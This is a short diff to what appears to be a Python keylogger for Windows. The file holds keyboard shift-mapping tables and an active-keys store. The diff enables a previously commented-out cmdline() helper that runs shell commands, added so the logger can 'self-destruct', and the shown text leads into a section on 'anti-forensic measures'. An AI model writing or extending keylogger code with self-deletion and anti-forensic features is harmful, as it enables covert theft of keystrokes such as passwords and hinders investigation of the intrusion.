@@ -6,6 +6,7 @@ import wmi
 import time
 import psutil
 import threading
+import subprocess
 
 from ctypes import *
 from datetime import datetime as dt
@@ -104,8 +105,7 @@ ShiftEquivs[0x38] = "*"
 ShiftEquivs[0x39] = "("
 
 ActiveKeys = {}
-###--NOT IMPLEMENTED IN BASE LOGGER---###
-"""
+# We need to be able to execute CMD commands to self-destruct if need be
 def cmdline(command):
     process = subprocess.Popen(
         args=command,
@@ -113,8 +113,7 @@ def cmdline(command):
         shell=True)
 
     return process.communicate()[0]
-"""
-###--NOT IMPLEMENTED IN BASE LOGGER---###
+
 """
 Here we have some anti-forensic measures.
 
